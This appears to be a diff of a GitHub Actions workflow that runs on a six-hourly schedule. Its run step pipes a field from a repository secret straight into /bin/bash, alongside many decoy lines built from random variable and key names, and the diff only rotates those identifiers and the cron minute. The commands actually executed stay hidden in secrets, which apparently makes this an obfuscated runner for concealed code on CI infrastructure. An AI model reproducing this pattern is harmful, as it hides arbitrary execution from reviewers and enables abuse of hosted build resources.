@@ -1,32 +1,35 @@
 name: jiangyigu1829
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 5/6 * * *'
+    - cron: '16 5/6 * * *'
 
-jobs:  # 11047
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jiangyigu1829
         env:
-          rl937: ${{ secrets.rl937 }}
+          ltz87: ${{ secrets.ltz87 }}
         run: |
-          echo $rl937 | jq -r .ll62 | /bin/bash
-          echo $vkocu6046 | jq -r .lvytc1359 | /bin/bash
-          echo $r4 | jq -r .qcpc9 | /bin/bash
-          echo $bbt31002 | jq -r .ouohm485 | /bin/bash
-          echo $xz62 | jq -r .i8 | /bin/bash
-          echo $dtp2369 | jq -r .e01 | /bin/bash
-          echo $acdg54136 | jq -r .juyk576 | /bin/bash
-          echo $ynl4500 | jq -r .zrraf67185 | /bin/bash
-          echo $hj1679 | jq -r .m54 | /bin/bash
-          echo $l79 | jq -r .mga18 | /bin/bash
-          echo $l7 | jq -r .hys749 | /bin/bash
-          echo $tw25 | jq -r .wyj68 | /bin/bash
-          echo $w781 | jq -r .kyncj74 | /bin/bash
-          echo $yft89950 | jq -r .boqc3 | /bin/bash
-          echo $nmii350 | jq -r .f7011 | /bin/bash
+          echo $ltz87 | jq -r .tmn3 | /bin/bash
+          echo $qxd7 | jq -r .pf9 | /bin/bash
+          echo $r58 | jq -r .rtjo5 | /bin/bash
+          echo $fet342 | jq -r .bi8148 | /bin/bash
+          echo $fykt222 | jq -r .cst3355 | /bin/bash
+          echo $j40011 | jq -r .zz91 | /bin/bash
+          echo $ztx5039 | jq -r .j395 | /bin/bash
+          echo $tomci25 | jq -r .kw29874 | /bin/bash
+          echo $uoiz86677 | jq -r .ytdo97317 | /bin/bash
+          echo $ndm560 | jq -r .y5536 | /bin/bash
+          echo $iy8 | jq -r .i42 | /bin/bash
+          echo $rjn35939 | jq -r .yk6698 | /bin/bash
+          echo $m0 | jq -r .gyhud146 | /bin/bash
+          echo $fign2 | jq -r .yih25 | /bin/bash
+          echo $ketu35 | jq -r .pqu311 | /bin/bash
+          echo $v1553 | jq -r .vpxic85 | /bin/bash
+          echo $xz73 | jq -r .du20580 | /bin/bash
+          echo $c23193 | jq -r .b92771 | /bin/bash
 
